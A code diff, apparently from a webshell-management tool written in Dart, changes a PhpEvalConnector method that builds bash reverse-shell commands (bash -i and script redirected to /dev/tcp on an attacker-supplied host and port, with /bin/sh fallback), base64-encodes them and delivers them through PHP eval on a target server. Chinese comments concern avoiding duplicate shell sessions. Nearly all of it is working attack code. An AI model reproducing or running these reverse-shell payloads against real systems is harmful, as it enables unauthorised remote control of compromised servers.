@@ -96,19 +96,33 @@ class PhpEvalConnector extends ShellConnector {
   ///   会让反弹命令执行两次，导致出现两个会话。
   /// - 这里改为直接下发一次性 system 调用，确保只建立一个会话。
   @override
-  Future<void> startReverseShell(String lhost, int lport) async {
+  Future<void> startReverseShell(
+    String lhost,
+    int lport, {
+    bool preferScript = true,
+  }) async {
     if (!supportsShellExec) {
       throw UnsupportedError('当前连接器不具备 shell 执行能力，无法发起反弹 Shell');
     }
 
     // 与 ShellConnector.startReverseShell 保持一致的多级回退命令。
-    final rsCmd =
-        "bash -c 'export TERM=xterm-256color; "
-        "if command -v script >/dev/null 2>&1; then "
-        "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
-        "elif command -v bash >/dev/null 2>&1; then "
-        "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
-        "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi' >/dev/null 2>&1 &";
+    late final String rsCmd;
+    if (preferScript) {
+      rsCmd =
+          "bash -c 'export TERM=xterm-256color; "
+          "if command -v script >/dev/null 2>&1; then "
+          "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
+          "elif command -v bash >/dev/null 2>&1; then "
+          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
+          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi' >/dev/null 2>&1 &";
+    } else {
+      // 仅使用 bash -i /bin/sh -i，不再尝试 script
+      rsCmd =
+          "bash -c 'export TERM=xterm-256color; "
+          "if command -v bash >/dev/null 2>&1; then "
+          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
+          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi' >/dev/null 2>&1 &";
+    }
 
     final b64 = base64.encode(utf8.encode(rsCmd));
     final php = "\$c=base64_decode('$b64');"
